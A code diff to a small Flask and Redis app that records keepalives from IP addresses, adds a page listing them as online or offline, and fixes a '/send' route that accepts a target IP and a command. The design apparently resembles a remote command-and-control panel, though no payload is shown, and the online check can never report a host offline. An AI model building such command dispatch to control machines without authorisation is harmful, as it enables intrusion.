@@ -1,4 +1,4 @@
-from flask import Flask, request, make_response, Response, jsonify
+from flask import Flask, request, make_response, Response, jsonify, render_template
 import redis
 import json
 import os
@@ -6,6 +6,23 @@ import datetime
 
 app = Flask(__name__)
 r = redis.Redis(host='localhost', port=6379)
+
+@app.route('/')
+def index():
+    ip_addresses = r.keys('keepalive:*')
+    all_ips = [ip.decode('utf-8').split(':')[1] for ip in ip_addresses]
+
+    online_ips = []
+    offline_ips = []
+
+    for ip in all_ips:
+        if r.exists(f'keepalive:{ip}'):
+            online_ips.append(ip)
+        else:
+            offline_ips.append(ip)
+
+    return render_template('index.html', online_ips=online_ips, offline_ips=offline_ips)
+
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -22,7 +39,7 @@ def keepalive():
 
     return 'Keepalive recorded'
 
-@app.route('send' , methods=['POST'])
+@app.route('/send' , methods=['POST'])
 def send():
     ip_address = request.form.get('ip_address')
     command = request.form.get('command')
